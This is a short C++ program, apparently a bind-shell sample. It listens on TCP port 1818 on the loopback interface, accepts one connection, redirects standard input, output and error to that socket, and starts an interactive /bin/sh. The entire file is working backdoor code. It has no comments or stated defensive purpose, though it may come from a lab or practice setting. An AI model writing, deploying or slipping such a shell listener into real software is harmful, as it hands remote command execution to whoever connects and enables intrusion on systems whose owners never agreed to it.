#include <arpa/inet.h>
#include <errno.h>
#include <iostream>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>


const uint16_t TCP_PORT = 1818;


int main(int argc, char **argv) {
    (void)argc;
    (void)argv;

    int hostSocket = -1;
    int clientSocket = -1;
    struct sockaddr_in socketAddress = {};

    if ((hostSocket = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        std::cerr << "Socket creation failed!" << std::endl;
        return 1;
    }

    socketAddress.sin_family = AF_INET;
    socketAddress.sin_port = htons(TCP_PORT);
    socketAddress.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if (bind(hostSocket, reinterpret_cast<struct sockaddr *>(&socketAddress), sizeof(socketAddress)) < 0) {
        std::cerr << "Assigning name to socket failed!" << std::endl;
        return 1;
    }

    listen(hostSocket, 2);

    clientSocket = accept(hostSocket, nullptr, nullptr);

    for (int i = 0; i < 3; i++) {
        dup2(clientSocket, i);
    }

    char* command = const_cast<char *>("/bin/sh");
    char* arguments[] = {command, const_cast<char *>("-i"), nullptr};

    if (execve(command, arguments, nullptr) < 0) {
        std::cerr << "Executing shell failed with error code " << errno << std::endl;
    }

    close(hostSocket);

    return 0;
}
